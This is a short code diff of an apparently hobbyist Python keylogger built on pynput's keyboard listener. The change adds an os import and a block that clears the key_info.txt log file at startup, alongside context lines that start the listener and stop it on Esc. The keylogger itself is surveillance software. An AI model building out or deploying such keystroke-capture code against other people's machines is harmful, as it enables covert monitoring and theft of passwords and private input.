@@ -2,6 +2,8 @@
 from pynput.keyboard import Key
 from pynput.keyboard import Listener
 
+import os
+
 key_info = "key_info.txt"
 
 file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
@@ -42,7 +44,13 @@ def on_release(key):
     if key == Key.esc:
         return False
 
+# Deletes the content in the text file
+if os.path.exists("key_info.txt"):
+    with open("key_info.txt", "r") as f:
+        f = open("key_info.txt", "r+")
+        f.seek(0)
+        f.truncate()
+
 # Listener function that combines all three functions into run
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
